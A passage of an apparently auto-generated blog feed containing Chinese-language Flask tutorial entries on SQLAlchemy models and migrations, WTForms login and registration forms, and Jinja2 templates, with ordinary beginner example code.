RegisterForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        u = User(username=form.username.data,email=form.email.data)</span><br><span class="line">        u.set_password_hash(form.password.data)</span><br><span class="line">        db.session.add(u)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&apos;Congratulations, You have registered the user! &apos;)</span><br><span class="line">        return redirect(url_for(&apos;login&apos;))</span><br><span class="line">    return render_template(&apos;register.html&apos;,form=form)</span><br></pre></td></tr></table></figure><ul><li>注意的点</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class RegisterForm(FlaskForm):</span><br><span class="line">    username = StringField(&apos;Username&apos;,validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(&apos;Password&apos;,validators=[DataRequired()])</span><br><span class="line">    password2 = PasswordField(&apos;Re-enter Password&apos;,validators=[DataRequired(),EqualTo(&apos;password&apos;)])</span><br><span class="line">    email = StringField(&apos;Email&apos;,validators=[DataRequired(),Email()])</span><br><span class="line">    submit = SubmitField(&apos;Submit&apos;)</span><br><span class="line"></span><br><span class="line">    # 在这里增加validate_&lt;field&gt; 函数，等到校验的时候，也会一并执行</span><br><span class="line">    def validate_username(self,username):</span><br><span class="line">        user = User.query.filter_by(username=username.data).first()</span><br><span class="line">        if user is not None:</span><br><span class="line">            raise ValidationError(&apos;The user has exists.&apos;)</span><br><span class="line"></span><br><span class="line">    def validate_email(self,email):</span><br><span class="line">        user = User.query.filter_by(email=email.data).first()</span><br><span class="line">        if user is not None:</span><br><span class="line">            raise ValidationError(&apos;The email has exists&apos;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;使用flask 实现登录的功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;用户登录&quot;&gt;&lt;a class=&quot;m
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Flask04 - Database</title>
    <link href="http://yoursite.com/2018/06/09/Flask04-Database/"/>
    <id>http://yoursite.com/2018/06/09/Flask04-Database/</id>
    <published>2018-06-09T13:19:29.000Z</published>
    <updated>2018-06-18T16:20:07.858Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>简述flask中数据库的应用</p></blockquote><h1 id="flask中的数据库"><a class="markdownIt-Anchor" href="#flask中的数据库"></a> flask中的数据库</h1><ol><li>安装数据库相关依赖</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-sqlalchemy</span><br><span class="line">pip install flask-migrate</span><br><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure><ol start="2"><li>数据库配置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 添加配置文件</span><br><span class="line"># configure.py</span><br><span class="line"></span><br><span class="line"># 数据库地址</span><br><span class="line">SQLALCHEMY_DATABASE_URI = os.environ.get(&apos;SQLALCHEMY_DATABASE_URI&apos;) or &quot;mysql+pymysql://root:qwe123@127.0.0.1/microblog&quot;</span><br><span class="line"># 是否记录application每次改变的信号。没什么用</span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = False</span><br></pre></td></tr></table></figure><ol start="3"><li>在初始化app文件中引入</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># __init__.py</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">migrate = Migrate(app,db)</span><br></pre></td></tr></table></figure><ol start="4"><li>设计并定义models</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from microblogapp import db</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">class User(db.Model):</span><br><span class="line">    __tablename__ = &apos;user&apos;</span><br><span class="line">    id = db.Column(db.Integer,primary_key=True)</span><br><span class="line">    username = db.Column(db.String(64),unique=True,index=True)</span><br><span class="line">    password_hash = db.Column(db.String(128))</span><br><span class="line">    email = db.Column(db.String(64),index=True,unique=True)</span><br><span class="line">    # 存储一个字段，相当于执行了一次查询</span><br><span class="line">    posts = db.relationship(&apos;Post&apos;,backref=&apos;author&apos;,lazy=&apos;dynamic&apos;)</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &quot;&lt;User : &#123;&#125;&gt;&quot;.format(self.username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Post(db.Model):</span><br><span class="line">    __tablename__ = &apos;post&apos;</span><br><span class="line">    id = db.Column(db.Integer,primary_key=True)</span><br><span class="line">    body = db.Column(db.String(140))</span><br><span class="line">    timestamp = db.Column(db.DateTime,index=True,default=datetime.now)</span><br><span class="line">    # 外键，小写表名.id，通常采用蛇形写法： user_id</span><br><span class="line">    user_id = db.Column(db.Integer,db.ForeignKey(&apos;user.id&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &quot;&lt;Post:&#123;&#125;&gt;&quot;.format(self.body)</span><br></pre></td></tr></table></figure><ol start="5"><li>变更数据库结构，如何更好的迁移？</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用flask_migrate来做迁移和记录。</span><br><span class="line">注意： </span><br><span class="line">这里我们需要再run.py,也就是指定flask app的python文件里面，指定models，要不然migrate识别不到。</span><br><span class="line"></span><br><span class="line"># run.py</span><br><span class="line">from microblogapp import models</span><br><span class="line"></span><br><span class="line"># command</span><br><span class="line">flask db init</span><br><span class="line">flask db migrate -m &quot;init db&quot;</span><br><span class="line">flask db upgrade</span><br><span class="line"></span><br><span class="line"># 如何回滚？</span><br><span class="line">flask db downgrade </span><br><span class="line"></span><br><span class="line"># 如何回滚到之前的多个版本</span><br><span class="line">flask db downgrade f37d(版本号)</span><br><span class="line"></span><br><span class="line">* 版本号存在于 migrations/versions/ 下面</span><br></pre></td></tr></table></figure><ol start="6"><li>数据库中的关系</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 这里只暂时讲到了一对多的关系。</span><br><span class="line"># 一个人可以写多篇文章</span><br><span class="line"></span><br><span class="line">#在User里面</span><br><span class="line">posts = db.relationship(&apos;Post&apos;,backref=&apos;author&apos;,lazy=&apos;dynamic&apos;)</span><br><span class="line"></span><br><span class="line">实际上，posts不是数据库里面的一个字段，</span><br><span class="line">orm框架使用db.relationship这个函数，</span><br><span class="line">执行了查询语句,</span><br><span class="line">** 返回了关于这个User的Post对象，是一个列表</span><br><span class="line"></span><br><span class="line">u.posts =&gt; [Post1,Post2,Post3...]</span><br><span class="line"></span><br><span class="line"># 还可以进一步查询</span><br><span class="line">Post1.body</span><br><span class="line">Post1.timestamp</span><br><span class="line"></span><br><span class="line"># backref用于之处 &quot;多&quot; 的一端 指向 &quot;一&quot;的一端。</span><br><span class="line">p = Post.query.filter_by(xxx).first()</span><br><span class="line">p.author === &gt; 查出了User这个对象</span><br><span class="line"></span><br><span class="line"># 也就是说backref用于 『多』的一端 检索『一』的一端</span><br></pre></td></tr></table></figure><ol start="7"><li>数据库在flask中的查询语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 查询User</span><br><span class="line">u = User.query.filter_by(username=&apos;johnw&apos;).first()</span><br><span class="line"># 查询文章</span><br><span class="line">u.posts ==&gt; [Post1,Post2]</span><br><span class="line"></span><br><span class="line"># 查询文章内容</span><br><span class="line">for post in u.posts:</span><br><span class="line">    print(post.body)</span><br><span class="line"></span><br><span class="line"># 添加用户</span><br><span class="line">u = User(username=&apos;johnw&apos;)</span><br><span class="line"># 添加文章</span><br><span class="line">p = Post(body=&quot;Hello world!&quot;)</span><br><span class="line"># 指定作者</span><br><span class="line">p.author = u</span><br><span class="line"></span><br><span class="line"># 按照username降序排列</span><br><span class="line">u = User.query.order_by(User.username.desc()).all()</span><br></pre></td></tr></table></figure><ol start="8"><li>shell语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 为了更加方便我们在shell里面调试语句</span><br><span class="line">@app.shell_context_processor</span><br><span class="line">def make_shell_context():</span><br><span class="line">    return &#123;&quot;db&quot;:db,&quot;User&quot;:models.User,&quot;Post&quot;:models.Post&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">多的一端 存个id就好了</span><br><span class="line">一的一端 需要存个relationship</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;简述flask中数据库的应用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;flask中的数据库&quot;&gt;&lt;a cla
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Flask03 - Web Form</title>
    <link href="http://yoursite.com/2018/06/09/Flask03-Web-Form/"/>
    <id>http://yoursite.com/2018/06/09/Flask03-Web-Form/</id>
    <published>2018-06-09T13:18:48.000Z</published>
    <updated>2018-06-18T16:20:11.413Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>简述了如何在flask中实现表单应用</p></blockquote><h1 id="flask-wtf"><a class="markdownIt-Anchor" href="#flask-wtf"></a> Flask-WTF</h1><ol><li>安装</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask_wtf</span><br></pre></td></tr></table></figure><ol start="2"><li>配置文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 配置文件应该单独出来</span><br><span class="line"># 表单需要用到secret key 做为CSRF的防护</span><br><span class="line"></span><br><span class="line">import os </span><br><span class="line">class Configure(object):</span><br><span class="line">    SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &quot;You-never-guess&quot;</span><br><span class="line"></span><br><span class="line">#最后要在application初始化文件里面</span><br><span class="line"># 引入这个配置</span><br><span class="line"></span><br><span class="line">#__init__.py</span><br><span class="line">app.config.from_object(Configure)</span><br></pre></td></tr></table></figure><ol start="3"><li>csrf</li></ol><blockquote><p>介绍： <a href="https://zh.wikipedia.org/zh/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">https://zh.wikipedia.org/zh/跨站请求伪造</a></p></blockquote><ol start="4"><li>配置文件的敏感数据</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将配置文件中的敏感数据做为系统变量，这样可以避免敏感数据的泄露，将开发和运维分离。</span><br></pre></td></tr></table></figure><ol start="5"><li>创建登录表单</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 主要的功能导入</span><br><span class="line">from flask_wtf import FlaskForm</span><br><span class="line"># 引入字段</span><br><span class="line">from wtforms import StringField,PasswordField,SubmitField,BooleanField</span><br><span class="line"># 引入验证</span><br><span class="line">from wtforms.validators import DataRequired</span><br><span class="line"></span><br><span class="line">class LoginForm(FlaskForm):</span><br><span class="line">    username = StringField(&apos;Username&apos;,validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(&apos;Password&apos;,validators=[DataRequired()])</span><br><span class="line">    remember_me = BooleanField(&apos;Remember Me&apos;)</span><br><span class="line">    submit = SubmitField(&apos;Submit&apos;)</span><br></pre></td></tr></table></figure><ol start="6"><li>html中的表单</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; form.hidden_tag() &#125;&#125;: 藏着crsf token</span><br><span class="line">&#123;&#123; form.username(class_=&apos;username&apos;) &#125;&#125;: 括号里面可以设置class name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 代码：</span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;POST&apos;&gt;</span><br><span class="line">    &#123;&#123; form.hidden_tag() &#125;&#125;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &#123;&#123; form.username.label() &#125;&#125;</span><br><span class="line">        &#123;&#123; form.username(class_=&apos;username&apos;)&#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &#123;&#123; form.password.label() &#125;&#125;</span><br><span class="line">        &#123;&#123; form.password(class_=&apos;password&apos;)&#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &#123;&#123; form.remember_me(class_=&apos;remember_me&apos;)&#125;&#125;&#123;&#123; form.remember_me.label() &#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; form.submit() &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ol start="7"><li>处理表单的路由事件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from microblogapp.forms import LoginForm</span><br><span class="line">@app.route(&apos;/login&apos;)</span><br><span class="line">def login():</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        flash(&apos;Login Request from user: &#123;&#125; and remember me: &#123;&#125;&apos;.format(form.username.data,form.remember_me.data))</span><br><span class="line">        return redirect(&apos;/index&apos;)</span><br><span class="line">    </span><br><span class="line">    return render_template(&apos;login.html&apos;,form=form,title=&apos;login&apos;)</span><br></pre></td></tr></table></figure><ol start="8"><li>flash的内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 使用with 声明一个变量来接受函数的返回值 --&gt;</span><br><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">&lt;!-- 返回了一个列表 --&gt;</span><br><span class="line">    &#123;% if messages %&#125;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &#123;% for message in messages %&#125;</span><br><span class="line">                &lt;li&gt;&#123;&#123; message &#125;&#125;&lt;/li&gt;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &#123;% endif %&#125;        </span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><ol start="9"><li>错误内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for error in form.username.errors %&#125;</span><br><span class="line">&lt;span style=&apos;color:red;&apos;&gt;&#123;&#123; error&#125;&#125;&lt;/span&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;简述了如何在flask中实现表单应用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;flask-wtf&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Flask02 - Templates</title>
    <link href="http://yoursite.com/2018/06/09/Flask02-Templates/"/>
    <id>http://yoursite.com/2018/06/09/Flask02-Templates/</id>
    <published>2018-06-09T13:18:00.000Z</published>
    <updated>2018-06-18T16:20:19.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>这一章主要讲了一下flask中的模板的概念</p></blockquote><h1 id="什么是模板"><a class="markdownIt-Anchor" href="#什么是模板"></a> 什么是模板</h1><ol><li>创建模板文件夹</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir microblogapp/templates</span><br></pre></td></tr></table></figure><ol start="2"><li>render_template 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">@app.route(&apos;/index&apos;)</span><br><span class="line">def index():</span><br><span class="line">    user = &#123;</span><br><span class="line">        &quot;username&quot;:&quot;jacky&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    posts = [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;author&quot;:&#123;</span><br><span class="line">                &quot;username&quot;:&quot;johnw&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;body&quot;:&quot;Hello World!!!&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;author&quot;:&#123;</span><br><span class="line">                &quot;username&quot;:&quot;Michael&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;body&quot;:&quot;Beeeeeautiful Wrold. &quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    #顾名思义，就是渲染模板的函数。第一个参数是要渲染的html。</span><br><span class="line">    #在templates文件夹里面，接下来的一系列函数都可以在html里面用&#123;&#123;&#125;&#125;进行引用</span><br><span class="line">    return render_template(&apos;index.html&apos;,user=user,posts=posts)</span><br></pre></td></tr></table></figure><ol start="3"><li>条件语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if title %&#125;</span><br><span class="line">    &lt;title&gt;&#123;&#123; title &#125;&#125; - microblog &lt;/title&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    &lt;title&gt;Hello - microblog &lt;/title&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>循环语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line">    &lt;div&gt;&lt;p&gt;&#123;&#123; post.author.username &#125;&#125; says: &#123;&#123; post.body &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>模板继承</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;basic.html&quot; %&#125;</span><br><span class="line">&#123;% block main %&#125;</span><br><span class="line">    ...</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;这一章主要讲了一下flask中的模板的概念&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;什么是模板&quot;&gt;&lt;a c
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
</feed>
